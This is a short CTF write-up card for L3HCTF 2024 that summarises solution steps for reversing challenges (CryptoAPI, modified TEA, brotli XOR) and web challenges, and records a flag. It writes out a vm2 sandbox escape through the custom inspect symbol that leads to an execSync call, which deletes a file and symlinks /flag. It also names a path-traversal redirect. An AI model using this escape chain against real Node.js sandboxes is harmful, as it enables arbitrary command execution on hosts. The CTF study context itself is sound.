---
title: "UKFC2024 L3HCTF WP"
category: web
tags: ["L3HCTF", "web", "cryptoapi-des-decrypt", "modified-tea-delta", "brotli-xor", "longest-common-subsequence"]
signals: ["L3HCTF 2024", "cryptoapi-des-decrypt", "modified-tea-delta", "brotli-xor", "longest-common-subsequence", "vm2-sandbox-escape", "custom-inspect", "calc-fibonacci-gauss", "web_unknown", "L3HCTF", "Windows", "CryptoAPI", "TEA", "brotli"]
difficulty: hard
source: "https://www.ctfiot.com/175079.html"
tools: []
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# UKFC2024 L3HCTF WP

> 赛事：L3HCTF 2024 | 方向：web | 难度：hard

## 一句话总结

L3HCTF 2024：Windows CryptoAPI + 魔改 TEA + brotli XOR + LCS DP + vm2 sandbox 逃逸 + Fibonacci/gauss 伪随机。

## 攻击链

1. Windows CryptoAPI: CryptAcquireContextA + CryptCreateHash + CryptHashData
2. CryptDeriveKey (AES-256) + CryptDecrypt 还原 v78 32 字节密文
3. 魔改 TEA: delta=0x114514, sum=delta*rounds, v1 -= ((v0<<4^v0>>5)+v0) ^ (sum+key[(sum>>11)&3])
4. brotli 解压 dump.br + XOR secret 6 字符密钥
5. 最长公共子序列 DP 求解 num2/num3 字符串集
6. num1 = 2023 + (num1 & 15) - (num1 & 240)
7. num2 = func2(num2+7) 斐波那契
8. num3 种子 random.seed(num3) + gauss(num2, 0.2)
9. flag: L3HCTF{202817711117711x25763695063}
10. /test/?redirect=AB6mJQxU 路径穿越拿 flag
11. vm2@3.9.19 Sandbox Escape via custom inspect
12. WebAssembly.compileStreaming(obj) + Symbol.for('nodejs.util.inspect.custom')
13. valueOf: undefined, constructor: undefined 绕过 vm2 沙箱
14. inspect.constructor('return process')().mainModule.require('child_process').execSync('rm error.txt;ln -s /flag error.txt')

## 关键 payload

```
Symbol.for(''nodejs.util.inspect.custom'')  # vm2 沙箱逃逸
```

## 经验教训

vm2 沙箱可被 Symbol.for('nodejs.util.inspect.custom') 配合 WebAssembly.compileStreaming 逃逸。

## 标签

cryptoapi-des-decrypt、modified-tea-delta、brotli-xor、longest-common-subsequence、vm2-sandbox-escape、custom-inspect、calc-fibonacci-gauss

## 参考来源

- https://www.ctfiot.com/175079.html
- 原文件：UKFC2024_L3HCTF_WP.full.md
